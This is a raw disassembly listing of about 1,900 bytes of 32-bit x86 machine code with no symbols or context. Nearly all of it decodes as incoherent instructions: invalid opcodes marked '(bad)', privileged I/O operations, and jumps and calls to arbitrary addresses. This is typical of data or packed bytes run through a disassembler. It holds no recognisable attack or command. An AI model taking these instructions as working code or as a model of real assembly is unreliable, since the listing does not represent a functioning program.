  40c9cb:	xor    ecx,DWORD PTR [ebp-0x2133adb7]
  40c9d1:	pop    ebx
  40c9d2:	and    dh,BYTE PTR gs:0x44d65d2c
  40c9d9:	std    
  40c9da:	adc    al,bl
  40c9dc:	mov    cl,0x5b
  40c9de:	pop    esp
  40c9df:	imul   esi,DWORD PTR [ebx+0x7c5f4fd7],0xfffffff9
  40c9e6:	ret    
  40c9e7:	push   edx
  40c9e8:	ins    BYTE PTR es:[edi],dx
  40c9e9:	out    dx,al
  40c9ea:	fcmovne st,st(5)
  40c9ec:	push   ebx
  40c9ed:	or     BYTE PTR [ebx-0x2f75a14b],ch
  40c9f3:	push   ebp
  40c9f4:	scas   eax,DWORD PTR es:[edi]
  40c9f5:	(bad)  
  40c9f6:	ja     0x40c998
  40c9f8:	sub    edx,DWORD PTR [edx-0x29]
  40c9fb:	pop    edi
  40c9fc:	dec    ebx
  40c9fd:	je     0x40ca6d
  40c9ff:	xchg   WORD PTR es:[eax+ebx*8-0x7a8ab593],cx
  40ca08:	jbe    0x40ca6e
  40ca0a:	inc    esi
  40ca0b:	jb     0x40c991
  40ca0d:	fistp  QWORD PTR [ebp+0x6c4a1ac0]
  40ca13:	stc    
  40ca14:	mov    ebp,0x4bf515b2
  40ca19:	cmp    eax,0x15596757
  40ca1e:	or     DWORD PTR [ebp-0x61],ebx
  40ca21:	or     edi,DWORD PTR [edi-0x11f9ddcc]
  40ca27:	imul   ebp,DWORD PTR [ecx-0x77],0x6a
  40ca2b:	call   0x23eef89b
  40ca30:	inc    ecx
  40ca31:	pop    ebx
  40ca32:	push   0xffffffe8
  40ca34:	mov    ds:0x81b3e17c,eax
  40ca39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca3a:	mov    esi,eax
  40ca3c:	test   ebx,esp
  40ca3e:	push   ebx
  40ca3f:	jae    0x40ca16
  40ca41:	popf   
  40ca42:	int    0x49
  40ca44:	inc    esp
  40ca45:	enter  0x9a82,0x9f
  40ca49:	iret   
  40ca4a:	iret   
  40ca4b:	int    0xeb
  40ca4d:	or     eax,0xd1c9cb82
  40ca52:	cmp    esi,eax
  40ca54:	xor    eax,0xa3c0b3a1
  40ca59:	push   ebx
  40ca5a:	sub    eax,0x3bca3b03
  40ca5f:	sub    DWORD PTR ds:0x230b908f,edx
  40ca65:	ins    BYTE PTR es:[edi],dx
  40ca66:	push   0x7e
  40ca68:	aas    
  40ca69:	in     al,0xfd
  40ca6b:	fidivr WORD PTR gs:[esi-0x66]
  40ca6f:	mov    dl,0x9e
  40ca71:	clc    
  40ca72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca73:	jmp    0x9ca9:0xcc9981e0
  40ca7a:	pop    es
  40ca7b:	sbb    al,0xac
  40ca7d:	sbb    eax,0x4639799e
  40ca82:	cmp    ebp,DWORD PTR [ebp+0x19]
  40ca85:	add    BYTE PTR [edi+eax*4-0x200282ea],bl
  40ca8c:	daa    
  40ca8d:	in     al,0xdd
  40ca8f:	sub    DWORD PTR es:[eax+edx*4],eax
  40ca93:	xor    esi,DWORD PTR [ebp-0xd]
  40ca96:	aaa    
  40ca97:	es shr esp,cl
  40ca9a:	push   esi
  40ca9b:	mov    dl,BYTE PTR [edx]
  40ca9d:	arpl   WORD PTR [edx-0x29],bx
  40caa0:	mov    edx,0x5d5005ca
  40caa5:	pop    esp
  40caa6:	mov    bl,0xef
  40caa8:	pop    edx
  40caa9:	scas   al,BYTE PTR es:[edi]
  40caaa:	xor    BYTE PTR gs:[edx+0x59],0xec
  40caaf:	aam    0xd
  40cab1:	mov    ds:0x630b32ee,al
  40cab6:	jl     0x40ca4f
  40cab8:	lock adc cl,BYTE PTR [esi+0x7adf05ac]
  40cabf:	(bad)  
  40cac1:	lahf   
  40cac2:	xor    eax,0x512a8ff4
  40cac7:	repz rcl dl,1
  40caca:	push   edx
  40cacc:	xchg   BYTE PTR [ecx+edi*4],bh
  40cacf:	mov    dh,0x6
  40cad1:	mov    ebp,0x9fd56f52
  40cad6:	mov    edx,ebp
  40cad8:	pop    eax
  40cad9:	mov    ch,0x60
  40cadb:	and    BYTE PTR [eax],cl
  40cadd:	pop    edx
  40cade:	mov    al,ds:0x61ec5755
  40cae3:	div    ah
  40cae5:	sbb    ah,BYTE PTR [ebx]
  40cae7:	cld    
  40cae8:	mov    edi,0x559a82b
  40caed:	bound  esi,QWORD PTR [ebp+0x4ffd2fd7]
  40caf3:	dec    ecx
  40caf4:	es pop edx
  40caf6:	sub    esi,DWORD PTR [ebx-0x26e03256]
  40cafc:	and    dh,BYTE PTR [ebx+0x52f6e58e]
  40cb02:	xor    dl,BYTE PTR [ebx-0x11]
  40cb05:	push   cs
  40cb06:	mov    eax,0x46f577d4
  40cb0b:	call   0xc4e52613
  40cb10:	fadd   QWORD PTR [ecx-0x4b]
  40cb13:	in     eax,dx
  40cb14:	xacquire xchg BYTE PTR [ebx+edx*1-0x6466a86c],dl
  40cb1c:	aas    
  40cb1d:	call   0xd8bf:0x2dfbcc90
  40cb24:	in     eax,0x90
  40cb26:	fnstenv [edx]
  40cb28:	stc    
  40cb29:	and    eax,0xb9ce6571
  40cb2e:	rcl    DWORD PTR [ecx-0x33],cl
  40cb31:	jae    0x40cb5f
  40cb33:	push   ebx
  40cb34:	out    0x90,al
  40cb36:	xor    eax,0x733cff04
  40cb3b:	pop    es
  40cb3c:	xor    ebp,DWORD PTR [edx-0x7562578b]
  40cb42:	(bad)  
  40cb43:	pop    ecx
  40cb44:	jge    0x40cb52
  40cb46:	cmp    DWORD PTR [edi],eax
  40cb48:	repnz mov esi,0xc21e18fc
  40cb4e:	xchg   ebp,eax
  40cb4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb50:	test   BYTE PTR [esi-0xd],dh
  40cb53:	les    ebp,FWORD PTR [ecx]
  40cb55:	pop    es
  40cb56:	test   al,0xed
  40cb58:	sti    
  40cb59:	cmp    bh,BYTE PTR [ebx]
  40cb5b:	xchg   esp,eax
  40cb5c:	pop    ss
  40cb5d:	add    BYTE PTR [edx],dh
  40cb5f:	js     0x40cbb2
  40cb61:	and    DWORD PTR [eax+0x7],edi
  40cb64:	es mov ah,0x9e
  40cb67:	das    
  40cb68:	repnz mov ebp,0x82b5224d
  40cb6e:	int    0x9d
  40cb70:	xor    al,0x93
  40cb72:	jmp    0x3dfb3ebb
  40cb77:	push   esp
  40cb78:	xchg   ecx,eax
  40cb79:	sbb    eax,0x7d1c52db
  40cb7e:	xor    eax,0xfabd69db
  40cb83:	int3   
  40cb84:	ins    DWORD PTR es:[edi],dx
  40cb85:	popf   
  40cb86:	sub    eax,0xf6c5c9c9
  40cb8b:	or     DWORD PTR [edx+0x72],0xa5d1c909
  40cb92:	cwde   
  40cb93:	out    0x36,al
  40cb95:	jmp    0x40cb53
  40cb97:	in     al,0x87
  40cb99:	shl    BYTE PTR [ebp-0x3bb91bb4],0xc5
  40cba0:	jle    0x40cb6b
  40cba2:	mov    al,BYTE PTR [eax]
  40cba4:	(bad)  
  40cba5:	div    DWORD PTR [edi-0x71]
  40cba8:	call   0xb205ea46
  40cbad:	lods   al,BYTE PTR ds:[esi]
  40cbae:	sbb    BYTE PTR [ebx+0x5b61d1b9],0x3c
  40cbb5:	lods   al,BYTE PTR ds:[esi]
  40cbb6:	sub    dh,BYTE PTR [ebp-0x39]
  40cbb9:	int3   
  40cbba:	inc    esi
  40cbbb:	inc    ebp
  40cbbc:	das    
  40cbbd:	sar    BYTE PTR [eax+0xc],cl
  40cbc0:	jmp    0x40cb4b
  40cbc2:	loopne 0x40cbee
  40cbc4:	jl     0x40cb85
  40cbc6:	mov    bh,0xb2
  40cbc8:	and    ch,BYTE PTR [esi]
  40cbca:	sti    
  40cbcb:	mov    DWORD PTR [edx],edi
  40cbcd:	jle    0x40cbbb
  40cbcf:	push   0xd33021ff
  40cbd4:	adc    al,0xca
  40cbd6:	mov    dh,0xe4
  40cbd8:	loop   0x40cbc5
  40cbda:	loopne 0x40cb9c
  40cbdc:	fdiv   DWORD PTR [esi+0x7f]
  40cbdf:	push   0x41
  40cbe1:	mov    al,ds:0x21c22e88
  40cbe6:	les    edi,FWORD PTR [ebx-0xc]
  40cbe9:	or     ebp,DWORD PTR [edx+0x32]
  40cbec:	rol    BYTE PTR [edi+0xd],0xc
  40cbf0:	or     al,0x6c
  40cbf2:	mov    ah,0xfa
  40cbf4:	add    eax,0xc1d2706a
  40cbf9:	jmp    0x40cbc5
  40cbfb:	xchg   edx,eax
  40cbfc:	les    eax,FWORD PTR [ebx-0x7a5af9a3]
  40cc02:	ins    DWORD PTR es:[edi],dx
  40cc03:	outs   dx,BYTE PTR ds:[esi]
  40cc04:	inc    edi
  40cc05:	push   cs
  40cc06:	ret    0xc861
  40cc09:	mov    ebp,0xd21a98f2
  40cc0e:	jae    0x40cc20
  40cc10:	cmp    edi,esi
  40cc12:	mov    edi,0x4cd7ce84
  40cc17:	clc    
  40cc18:	pop    ecx
  40cc19:	xchg   ecx,eax
  40cc1a:	xchg   ecx,eax
  40cc1b:	bound  ebx,QWORD PTR [edx-0xc61da0a]
  40cc21:	jbe    0x40cc94
  40cc23:	test   eax,0x9d9f1693
  40cc28:	aad    0xe6
  40cc2a:	ret    0xd2ea
  40cc2d:	pop    edx
  40cc2e:	cmp    al,0xbb
  40cc30:	dec    ecx
  40cc31:	fistp  DWORD PTR [esi-0x6e]
  40cc34:	pop    ecx
  40cc35:	mov    eax,0x8f1e6e68
  40cc3a:	add    al,0x55
  40cc3c:	repz mov bl,0x50
  40cc3f:	jmp    0x36fa:0xe100b02d
  40cc46:	sahf   
  40cc47:	or     ch,BYTE PTR [esi]
  40cc49:	rcr    BYTE PTR [edi+0x5b],cl
  40cc4c:	jp     0x40cc20
  40cc4e:	sbb    DWORD PTR [eax+ebp*1-0x43],esp
  40cc52:	shl    dl,0xd9
  40cc55:	mov    BYTE PTR [esp+edi*8-0x8940afd],dh
  40cc5c:	jl     0x40ccce
  40cc5e:	es popf 
  40cc60:	mov    edi,0x91bf5f78
  40cc65:	sub    ecx,DWORD PTR [eax]
  40cc67:	aaa    
  40cc68:	dec    ebx
  40cc69:	clc    
  40cc6a:	push   ds
  40cc6b:	je     0x40cbf3
  40cc6d:	mov    dh,0x4c
  40cc6f:	mov    edi,0xcac29115
  40cc74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc75:	mov    ss,WORD PTR ds:0xe7f2e412
  40cc7b:	cmp    esp,DWORD PTR [ebx+0x27c77492]
  40cc81:	jecxz  0x40cc16
  40cc83:	test   al,0xa2
  40cc85:	pop    edi
  40cc86:	cld    
  40cc87:	loope  0x40cc8f
  40cc89:	pop    ds
  40cc8a:	fld    TBYTE PTR [edi+0x1e4b655d]
  40cc90:	cmp    bl,BYTE PTR [ecx-0x5e59ace8]
  40cc96:	pop    ecx
  40cc97:	sub    edi,edi
  40cc99:	bswap  ecx
  40cc9b:	adc    edx,DWORD PTR [eax+0x18]
  40cc9e:	push   es
  40cc9f:	sbb    ecx,0xffffffdd
  40cca2:	adc    DWORD PTR [ecx+0x7e15b65a],ebp
  40cca8:	and    al,0x68
  40ccaa:	dec    ebx
  40ccab:	mov    ch,0x4a
  40ccad:	xchg   esi,eax
  40ccae:	loopne 0x40ccde
  40ccb0:	pop    ebx
  40ccb1:	(bad)  
  40ccb2:	cmp    edi,DWORD PTR [ebx-0x24]
  40ccb5:	jp     0x40cccc
  40ccb7:	js     0x40cc41
  40ccb9:	or     ebx,DWORD PTR [edx-0x2d7b90b3]
  40ccbf:	push   ecx
  40ccc0:	sub    DWORD PTR [esi+0x10],ebx
  40ccc3:	pop    ds
  40ccc4:	stos   DWORD PTR es:[edi],eax
  40ccc5:	int    0xb0
  40ccc7:	xchg   BYTE PTR [ecx+0x6b],al
  40ccca:	jmp    0x40cccc
  40cccc:	adc    cl,BYTE PTR [edx]
  40ccce:	cwde   
  40cccf:	scas   al,BYTE PTR es:[edi]
  40ccd0:	or     cl,al
  40ccd2:	dec    edi
  40ccd3:	mov    ebx,0x2fd3ec2e
  40ccd8:	or     ch,bl
  40ccda:	pop    ds
  40ccdb:	mov    al,BYTE PTR [ecx+edx*8-0x5c]
  40ccdf:	push   0x37e42f45
  40cce4:	lock and al,0x35
  40cce7:	xchg   edi,eax
  40cce8:	xchg   ebp,eax
  40cce9:	repz mov ah,0x8c
  40ccec:	mov    eax,0x8dc3adb4
  40ccf1:	lods   eax,DWORD PTR ds:[esi]
  40ccf2:	jbe    0x40cd71
  40ccf4:	(bad)  
  40ccf5:	stc    
  40ccf6:	not    DWORD PTR cs:[ebx+0xa469bb5]
  40ccfd:	jb     0x40cc81
  40ccff:	adc    BYTE PTR [esi-0x467feaff],ch
  40cd05:	cmp    DWORD PTR [esi-0xffbb39],esi
  40cd0b:	push   0xccec2a4b
  40cd10:	std    
  40cd11:	add    bh,BYTE PTR ds:0x3167f9ae
  40cd17:	repz jp 0x40cd98
  40cd1a:	sbb    cl,BYTE PTR [edx+0x15]
  40cd1d:	push   cs
  40cd1e:	jno    0x40cd6e
  40cd20:	add    ecx,ecx
  40cd22:	mov    al,ds:0x34e1c543
  40cd27:	pop    esp
  40cd28:	sub    eax,0x9f6ffec3
  40cd2d:	push   0x4b
  40cd2f:	in     al,0x1f
  40cd31:	push   ecx
  40cd32:	or     edx,0x5d211df1
  40cd38:	xor    BYTE PTR [ecx-0x72d5a7da],bl
  40cd3e:	mov    WORD PTR [esi],ds
  40cd40:	jnp    0x40ccc9
  40cd42:	ins    BYTE PTR es:[edi],dx
  40cd43:	lods   eax,DWORD PTR ds:[esi]
  40cd44:	fld    TBYTE PTR [edi+edi*1-0x7e2a7ea6]
  40cd4b:	sahf   
  40cd4c:	das    
  40cd4d:	clc    
  40cd4e:	sti    
  40cd4f:	and    eax,0x316e70f4
  40cd54:	jge    0x40ccfd
  40cd56:	push   ebp
  40cd57:	clc    
  40cd58:	outs   dx,BYTE PTR ds:[esi]
  40cd59:	call   0x4c8:0x1844075d
  40cd60:	ds push ebx
  40cd62:	pop    eax
  40cd63:	int3   
  40cd64:	push   eax
  40cd65:	pop    edx
  40cd66:	rcr    edi,1
  40cd68:	pop    esi
  40cd69:	jbe    0x40cd54
  40cd6b:	adc    BYTE PTR [ecx],cl
  40cd6d:	xchg   edi,eax
  40cd6e:	sbb    al,0xce
  40cd70:	push   es
  40cd71:	sbb    dh,al
  40cd73:	cdq    
  40cd74:	xchg   ecx,eax
  40cd75:	xchg   ebp,eax
  40cd76:	mov    WORD PTR [edx-0x3b],ds
  40cd79:	jl     0x40cde9
  40cd7b:	aad    0x6b
  40cd7d:	jo     0x40cd51
  40cd7f:	cmp    BYTE PTR [edi-0x5d],0x97
  40cd83:	jecxz  0x40cd66
  40cd85:	xchg   BYTE PTR [ecx-0x7c],bl
  40cd88:	dec    ecx
  40cd89:	and    al,0x60
  40cd8b:	in     eax,dx
  40cd8c:	mov    edx,0xc41e9ef3
  40cd91:	fs push ss
  40cd93:	int3   
  40cd94:	neg    DWORD PTR [eax]
  40cd96:	lahf   
  40cd97:	call   0x58a2:0x7071913c
  40cd9e:	aas    
  40cd9f:	and    al,BYTE PTR [ebx]
  40cda1:	outs   dx,BYTE PTR ds:[esi]
  40cda2:	dec    edi
  40cda3:	pop    ds
  40cda4:	mov    eax,ds:0xea0360d
  40cda9:	xchg   DWORD PTR [ebp+ecx*2-0x51],edi
  40cdad:	xor    eax,0x54142687
  40cdb2:	or     BYTE PTR [edi],0x57
  40cdb5:	rcl    DWORD PTR [ebp+0x5c],cl
  40cdb8:	add    al,0xc4
  40cdba:	pop    ds
  40cdbb:	inc    esi
  40cdbc:	mov    esp,0xd8917226
  40cdc1:	mov    ah,0x4b
  40cdc3:	out    dx,al
  40cdc4:	les    ebx,FWORD PTR [ebp-0x7e67b8cb]
  40cdca:	test   eax,0x38f6aed2
  40cdcf:	xchg   BYTE PTR [edx],ch
  40cdd1:	jno    0x40cd59
  40cdd3:	or     eax,0x9bec3b6c
  40cdd8:	scas   al,BYTE PTR es:[edi]
  40cdd9:	pop    ss
  40cdda:	jle    0x40cd80
  40cddc:	inc    ecx
  40cddd:	jae    0x40ce00
  40cddf:	fisubr DWORD PTR [esi+0x6c8997ef]
  40cde5:	mov    DWORD PTR [ecx+0x6d35e457],esp
  40cdeb:	ins    DWORD PTR es:[edi],dx
  40cdec:	jl     0x40cd73
  40cdee:	xor    al,0xab
  40cdf0:	xchg   ecx,eax
  40cdf1:	mov    edx,0x629d73ff
  40cdf6:	xor    eax,0x2d2de50
  40cdfb:	mov    al,0xae
  40cdfd:	mov    dl,0x7f
  40cdff:	lahf   
  40ce00:	rcl    ebx,cl
  40ce02:	push   ebx
  40ce03:	xchg   edi,eax
  40ce04:	add    DWORD PTR [ebx],0x6619fbd
  40ce0a:	mov    dl,0xf3
  40ce0c:	dec    esi
  40ce0d:	push   esi
  40ce0e:	popa   
  40ce0f:	jb     0x40cde0
  40ce11:	cmp    eax,0x783b4450
  40ce16:	mov    ds:0x5b28ed3e,al
  40ce1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce1c:	jbe    0x40ce32
  40ce1e:	pop    ebp
  40ce1f:	xlat   BYTE PTR ds:[ebx]
  40ce20:	xchg   edx,eax
  40ce21:	imul   edx,DWORD PTR [eax+ebx*1-0x4d],0xb684d9e3
  40ce29:	or     BYTE PTR [edi+0x4c],dl
  40ce2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce2d:	popa   
  40ce2e:	in     eax,dx
  40ce2f:	rol    DWORD PTR [ebx+0x62],1
  40ce32:	inc    esi
  40ce33:	cmp    al,0xe3
  40ce35:	rcr    dl,cl
  40ce37:	fisubr DWORD PTR [ebx+0x79c73bd5]
  40ce3d:	xor    eax,0x865cae50
  40ce42:	add    DWORD PTR [eax+0x3e32e57a],eax
  40ce48:	jnp    0x40cddd
  40ce4a:	or     al,0x1f
  40ce4c:	popf   
  40ce4d:	shl    DWORD PTR [ecx],0x67
  40ce50:	sahf   
  40ce51:	adc    al,0x88
  40ce53:	xor    BYTE PTR [ebx],bl
  40ce55:	pusha  
  40ce56:	jns    0x40ce83
  40ce58:	test   eax,0xf2fccea8
  40ce5d:	push   ds
  40ce5e:	cmp    BYTE PTR [esp+esi*2],ch
  40ce61:	sbb    edi,DWORD PTR [esp+ecx*4-0x72]
  40ce65:	push   esi
  40ce66:	xchg   ebp,eax
  40ce67:	push   ss
  40ce68:	addr16 mov ecx,0x67a24cac
  40ce6e:	inc    esi
  40ce6f:	jne    0x40ce71
  40ce71:	push   cs
  40ce72:	mov    cl,cl
  40ce74:	sub    esp,edi
  40ce76:	jb     0x40cef7
  40ce78:	in     al,0xf9
  40ce7a:	aad    0x51
  40ce7c:	imul   edi,ecx,0xd59e935b
  40ce82:	shr    ah,1
  40ce84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce85:	fmul   QWORD PTR [ebx]
  40ce87:	push   edi
  40ce88:	lea    esi,[ebx+edi*8]
  40ce8b:	inc    esi
  40ce8c:	and    eax,0xde91e980
  40ce91:	jb     0x40cea5
  40ce93:	xor    BYTE PTR [edx],cl
  40ce95:	mov    eax,0x4136e3c4
  40ce9a:	push   ebp
  40ce9b:	jae    0x40cede
  40ce9d:	push   0x6a64f76c
  40cea2:	dec    esp
  40cea3:	add    al,BYTE PTR [ecx-0x7c1392aa]
  40cea9:	mov    dl,0x69
  40ceab:	aam    0xa6
  40cead:	xchg   edi,eax
  40ceae:	js     0x40cefe
  40ceb0:	dec    ebx
  40ceb1:	push   es
  40ceb2:	mov    ebx,0x3b393520
  40ceb7:	pop    ebx
  40ceb8:	jp     0x40ceb9
  40ceba:	call   DWORD PTR [edx-0x1b]
  40cebd:	add    BYTE PTR [edx-0x8dfab47],dh
  40cec3:	cmp    eax,0x70b0e3bd
  40cec8:	push   ebx
  40cec9:	mov    eax,ds:0x32a7bfa2
  40cece:	popa   
  40cecf:	jae    0x40cf2e
  40ced1:	inc    ebp
  40ced2:	iret   
  40ced3:	or     eax,0xf9870ede
  40ced8:	les    esi,FWORD PTR [edx]
  40ceda:	stos   DWORD PTR es:[edi],eax
  40cedb:	push   esp
  40cedc:	call   0x56d8a369
  40cee1:	in     al,dx
  40cee2:	jne    0x40cf0c
  40cee4:	ret    
  40cee5:	xor    bh,ah
  40cee7:	sahf   
  40cee8:	std    
  40cee9:	pop    ss
  40ceea:	inc    ecx
  40ceeb:	xchg   BYTE PTR [eax-0x5c4d7116],bh
  40cef1:	jae    0x40ce9e
  40cef3:	or     bl,ah
  40cef5:	sbb    BYTE PTR [esi-0x18],dh
  40cef8:	pop    ebx
  40cef9:	aaa    
  40cefa:	leave  
  40cefb:	std    
  40cefc:	xor    esp,ebp
  40cefe:	and    al,0xd3
  40cf00:	popa   
  40cf01:	add    DWORD PTR [ebp+esi*8+0x66],esi
  40cf05:	popa   
  40cf06:	sub    ah,BYTE PTR [esi+0x48]
  40cf09:	jecxz  0x40cf79
  40cf0b:	shl    BYTE PTR [edi-0xe14bf68],0x12
  40cf12:	pop    ecx
  40cf13:	ins    DWORD PTR es:[edi],dx
  40cf14:	push   esp
  40cf15:	mov    ch,0xb7
  40cf17:	fwait
  40cf18:	push   ebp
  40cf19:	scas   al,BYTE PTR es:[edi]
  40cf1a:	mov    ebp,0xf02035d1
  40cf1f:	(bad)  
  40cf20:	aam    0x88
  40cf22:	push   0x62
  40cf24:	dec    eax
  40cf25:	gs retf 
  40cf27:	sbb    DWORD PTR [ebp-0x20081de9],0x7b
  40cf2e:	fist   WORD PTR [edx+edi*1-0x5c987f08]
  40cf35:	or     BYTE PTR [ecx-0x64d70ad9],cl
  40cf3b:	xor    BYTE PTR [eax-0x80],bl
  40cf3e:	xor    eax,0xc87eaa97
  40cf43:	outs   dx,DWORD PTR ds:[esi]
  40cf44:	mov    ch,0x24
  40cf46:	sub    eax,0x78dba335
  40cf4b:	inc    ebp
  40cf4c:	xchg   ebp,eax
  40cf4d:	(bad)  
  40cf4e:	sbb    ch,dh
  40cf50:	cld    
  40cf51:	jo     0xc6397f63
  40cf57:	jle    0x40cfbb
  40cf59:	add    eax,0x5f8731a1
  40cf5e:	fisttp DWORD PTR [esi-0xf]
  40cf61:	dec    esp
  40cf62:	imul   ebp,DWORD PTR [ebx-0x29],0xfc5a80c8
  40cf69:	xor    BYTE PTR [eax],0x55
  40cf6c:	sub    eax,0x55724e4
  40cf71:	call   0xe2ad:0x45476fc6
  40cf78:	cmp    esp,DWORD PTR [ebx]
  40cf7a:	add    edx,ecx
  40cf7c:	xor    edx,ebx
  40cf7e:	mov    ebx,DWORD PTR ds:0x434014
  40cf84:	or     DWORD PTR ds:0x436018,ebx
  40cf8a:	mov    DWORD PTR [ebp-0x50],edx
  40cf8d:	mov    edx,DWORD PTR [ebp+0x8]
  40cf90:	mov    ebx,DWORD PTR ds:0x434020
  40cf96:	sbb    DWORD PTR ds:0x43401c,ebx
  40cf9c:	mov    ebx,DWORD PTR [ebp-0x4c]
  40cf9f:	jmp    0x40f353
  40cfa4:	mov    DWORD PTR [edi+0x2c],0x73f3ac7a
  40cfab:	ret    
  40cfac:	xchg   esp,eax
  40cfad:	cs or  al,0xd2
  40cfb0:	mov    al,0x3d
  40cfb2:	bound  edx,QWORD PTR [edx+0x65]
  40cfb5:	loop   0x40d033
  40cfb7:	jl     0x40cfa4
  40cfb9:	pop    edi
  40cfba:	jl     0x40d038
  40cfbc:	stos   BYTE PTR es:[edi],al
  40cfbd:	dec    ebp
  40cfbe:	xor    eax,0x8f0d214f
  40cfc3:	add    BYTE PTR [edi],ch
  40cfc5:	rol    BYTE PTR [esp+ecx*4-0x13],cl
  40cfc9:	mov    DWORD PTR [ecx],edx
  40cfcb:	fidiv  DWORD PTR [esi+esi*8+0x20]
  40cfcf:	mov    edx,0x536bf9f8
  40cfd4:	inc    eax
  40cfd5:	push   ecx
  40cfd6:	stos   BYTE PTR es:[edi],al
  40cfd7:	sbb    al,BYTE PTR [edx+0x13295475]
  40cfdd:	xchg   ebp,eax
  40cfde:	sub    ah,0x93
  40cfe1:	std    
  40cfe2:	adc    bl,BYTE PTR [edx+0x51c22128]
  40cfe8:	and    BYTE PTR [esp+edx*4-0x26],ch
  40cfec:	loopne 0x40cfd9
  40cfee:	mov    ch,0x8c
  40cff0:	cmp    dh,BYTE PTR [edx]
  40cff2:	cli    
  40cff3:	ss fwait
  40cff5:	mov    bl,0x11
  40cff7:	daa    
  40cff8:	xor    eax,0xd468759c
  40cffd:	fsub   QWORD PTR [edx+ecx*2+0x3f07db58]
  40d004:	and    edx,esi
  40d006:	push   ss
  40d007:	shl    BYTE PTR [edx-0x53],0x3b
  40d00b:	dec    ecx
  40d00c:	lea    edi,[ebp+ecx*2+0x54280cf9]
  40d013:	lods   al,BYTE PTR ds:[esi]
  40d014:	dec    esi
  40d015:	add    ecx,DWORD PTR ds:0xc12fac30
  40d01b:	lods   al,BYTE PTR ds:[esi]
  40d01c:	imul   eax,edi,0x8f6d8859
  40d022:	(bad)  [ecx+0x2773574e]
  40d028:	sti    
  40d029:	je     0x40d04b
  40d02b:	mov    dl,0x58
  40d02d:	lods   eax,DWORD PTR ds:[esi]
  40d02e:	add    ebx,ebx
  40d030:	shl    BYTE PTR ds:0x7c635aa0,0xd1
  40d037:	push   ebx
  40d038:	mov    BYTE PTR [esi+0x5a],dl
  40d03b:	mov    esi,0xc3bc25bd
  40d040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d041:	repnz sbb al,0x4e
  40d044:	sub    dl,bh
  40d046:	add    al,0xd2
  40d048:	push   edi
  40d049:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d04a:	ror    BYTE PTR [edx+0x5f3f5869],1
  40d050:	retf   0x54d3
  40d053:	int3   
  40d054:	xchg   BYTE PTR [edi],ah
  40d056:	pop    ecx
  40d057:	aad    0xb1
  40d059:	pop    ebx
  40d05a:	cs cdq 
  40d05c:	cmp    cl,dh
  40d05e:	or     al,0x75
  40d060:	popf   
  40d061:	es add eax,0x50367204
  40d067:	sbb    eax,0x70d77930
  40d06c:	fist   DWORD PTR [ebx+0x69]
  40d06f:	loopne 0x40d063
  40d071:	or     DWORD PTR [eax],esi
  40d073:	int3   
  40d074:	aaa    
  40d075:	fs xchg ebp,eax
  40d077:	xchg   bl,cl
  40d079:	cli    
  40d07a:	sub    eax,0x79afc7b2
  40d07f:	sbb    al,0x44
  40d081:	mov    bl,bl
  40d083:	or     bl,BYTE PTR [eax+0x1e]
  40d086:	mov    bl,0x9a
  40d088:	sbb    BYTE PTR [edx-0x66],0x89
  40d08c:	mov    BYTE PTR [esi-0x6dd3c57e],cl
  40d092:	add    eax,ebx
  40d094:	call   0xe812b1a7
  40d099:	add    al,0x9c
  40d09b:	jmp    0x1aa:0x63ce5ad7
  40d0a2:	cmp    eax,0xe4de7368
  40d0a7:	(bad)  
  40d0a8:	call   0x9e05a82f
  40d0ad:	sub    DWORD PTR [ecx+0x597577f0],edx
  40d0b3:	wrmsr  
  40d0b5:	pushf  
  40d0b6:	into   
  40d0b7:	xor    BYTE PTR [edx+0x257b0db],0x21
  40d0be:	push   ecx
  40d0bf:	scas   al,BYTE PTR es:[edi]
  40d0c0:	sub    eax,0xee6e0e95
  40d0c5:	inc    ebp
  40d0c6:	adc    ch,BYTE PTR [edi+0xa]
  40d0c9:	rol    BYTE PTR [esi+ecx*4],cl
  40d0cc:	or     al,0xa7
  40d0ce:	enter  0x5ff3,0x4b
  40d0d2:	mov    bl,0x3a
  40d0d4:	cmp    al,0x92
  40d0d6:	jle    0x40d08a
  40d0d8:	pushf  
  40d0d9:	push   eax
  40d0da:	xchg   edi,eax
  40d0db:	push   esp
  40d0dc:	aaa    
  40d0dd:	mul    BYTE PTR [ebx]
  40d0df:	test   al,0xa5
  40d0e1:	ret    
  40d0e2:	(bad)  
  40d0e3:	push   ebx
  40d0e4:	daa    
  40d0e5:	mov    ds:0x3a7d4ffd,eax
  40d0ea:	jmp    0x38b609ac
  40d0ef:	bound  ecx,QWORD PTR [edx+0x76]
  40d0f2:	push   ecx
  40d0f3:	ret    
  40d0f4:	out    dx,eax
  40d0f5:	cmp    eax,0x3660142f
  40d0fa:	aad    0x5
  40d0fc:	cmc    
  40d0fd:	xor    DWORD PTR [ebx],0x75e881b
  40d103:	xchg   ecx,eax
  40d104:	jecxz  0x40d0d5
  40d106:	jmp    0x991d:0xc41bb2a3
  40d10d:	shl    DWORD PTR [ecx+0x5a8d5cea],cl
  40d113:	push   edx
  40d114:	fild   DWORD PTR [edi-0x5e]
  40d117:	pop    es
  40d118:	cmp    BYTE PTR [ecx+edx*8],dl
  40d11b:	jb     0x40d199
  40d11d:	pop    edx
  40d11e:	(bad)
  40d121:	cmp    BYTE PTR [ebx+0x1d],0xec
  40d125:	test   BYTE PTR [ecx+0x45e5a70e],dh
  40d12b:	jae    0x40d0dd
  40d12d:	jmp    0x74c838ca
  40d132:	cmp    bh,BYTE PTR [ebp+ebp*1-0x15]
  40d136:	mov    ch,0xbc
  40d138:	adc    DWORD PTR [edx+edx*4-0x6b8aca2a],edx
  40d13f:	(bad)  
  40d140:	aam    0xe0
  40d142:	mov    ebx,0xcba30879
  40d147:	imul   eax,DWORD PTR [ebx+0x6e],0xf
  40d14b:	jnp    0x40d1a8
  40d14d:	ja     0x40d102
  40d14f:	sub    al,0x23
  40d151:	jne    0x40d13a
  40d153:	daa    
  40d154:	and    BYTE PTR [ecx],0xb3
  40d157:	das    
  40d158:	push   ds
  40d159:	cmp    dl,BYTE PTR [eax+0x46]
  40d15c:	cld    
